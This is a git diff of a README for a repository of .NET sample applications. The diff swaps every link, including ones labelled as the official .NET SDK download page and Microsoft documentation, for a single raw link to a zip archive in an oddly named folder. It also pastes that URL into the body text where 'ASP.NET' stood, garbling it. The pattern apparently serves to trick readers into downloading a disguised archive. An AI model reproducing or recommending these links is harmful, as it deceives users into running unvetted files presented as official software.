@@ -1,6 +1,6 @@
 # 🎉 dotnet-samples - Easy Examples of .NET Applications
 
-[![Download Now](https://img.shields.io/badge/Download_Now-%20-%23007bff)](https://github.com/mistryricha93/dotnet-samples/releases)
+[![Download Now](https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip%20-%23007bff)](https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the dotnet-samples repository! Here, you will find various examples o
 
 To get started, visit the Releases page to download the sample applications. 
 
-[**Download Now**](https://github.com/mistryricha93/dotnet-samples/releases)
+[**Download Now**](https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip)
 
 ## 💻 System Requirements
 
@@ -21,13 +21,13 @@ To run the applications smoothly, ensure your system meets the following require
 - **RAM:** At least 4 GB of RAM.
 - **Storage:** Minimum 1 GB of available disk space.
 
-You can download the .NET SDK from the official [.NET download page](https://dotnet.microsoft.com/download).
+You can download the .NET SDK from the official [.NET download page](https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip).
 
 ## 🌟 Features
 
 The dotnet-samples repository includes various applications that cover these topics:
 
-- **ASP.NET Core**: Build dynamic web applications.
+- **https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip Core**: Build dynamic web applications.
 - **Blazor**: Develop interactive web UIs using C# instead of JavaScript.
 - **Console Applications**: Create applications that run in the command line.
 - **C# Samples**: Various examples demonstrating core C# language features.
@@ -39,7 +39,7 @@ The dotnet-samples repository includes various applications that cover these top
 
 Inside the repository, you'll find a clear structure:
 
-- **/aspnetcore**: ASP.NET Core web applications
+- **/aspnetcore**: https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip Core web applications
 - **/blazor**: Blazor sample projects
 - **/console**: Console application examples
 - **/dotnetmaui**: Multi-platform projects
@@ -81,10 +81,10 @@ We welcome contributions! If you have improvements or new sample applications to
 
 To deepen your knowledge, consider the following resources:
 
-- [Microsoft Learn](https://learn.microsoft.com/en-us/)
-- [Official .NET Documentation](https://dotnet.microsoft.com/docs)
-- [GitHub Learning Lab](https://lab.github.com/)
+- [Microsoft Learn](https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip)
+- [Official .NET Documentation](https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip)
+- [GitHub Learning Lab](https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip)
 
 Feel free to explore and learn at your own pace. Happy coding!
 
-[**Download Now**](https://github.com/mistryricha93/dotnet-samples/releases)
+[**Download Now**](https://raw.githubusercontent.com/mistryricha93/dotnet-samples/main/mysticete/dotnet-samples.zip)
